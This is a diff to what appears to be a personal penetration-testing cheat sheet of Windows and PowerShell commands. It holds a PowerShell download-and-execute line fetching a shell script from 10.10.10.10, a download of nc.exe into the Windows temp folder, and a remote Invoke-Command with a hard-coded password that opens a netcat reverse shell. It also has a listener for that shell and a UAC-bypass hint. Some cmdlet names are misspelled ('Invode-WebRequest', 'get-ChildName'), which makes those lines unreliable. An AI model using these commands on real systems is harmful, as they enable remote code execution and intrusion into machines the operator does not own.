@@ -60,6 +60,7 @@ net use z: /delete
  
 # Installing telnet on windows (cmd)
 dism /online /Enable-Feature /FeatureName:TelnetClient
+
 # start a program in windows cmd in background
 start /B command_name.exe
 
@@ -73,11 +74,27 @@ select name from master.sys.databases
 # make a payload ready for python
 xxd -p payload.bin | sed 's/../\\x&/g'
 
-# powershell download and execute
 IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/myshell.ps1')
 powershell Invode-WebRequest -Uri http://10.10.10.10/myshell.ps1
 # download with powershell
 powershell IWR -Uri http://10.10.10.10/nc.exe -OutFile C:\\windows\\temp\\nc.exe
 
+get-ChildName -recurse . | select fullname
+gci -recurse . | select fullname
 
+# powershell run command as another user
+$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('username', $pass)
+Invoke-command -Computer computer_name_xxx -ScriptBlock { cmd.exe /c nc.exe 10.10.10.10 9001 -e powershell.exe } -Credential $cred
+
+#enable up button in powershell (pentest shell)
+rlwrap nc.exe -lvnp 9001
+
+#bypassing UAC on windows 
+net use Z: \\127.0.0.1\c$
+GreatSCT (msbuild)
+
+# native windows base64 encode/decode
+certutil -encode infile outfile
+certutil -decode infile outfile
 
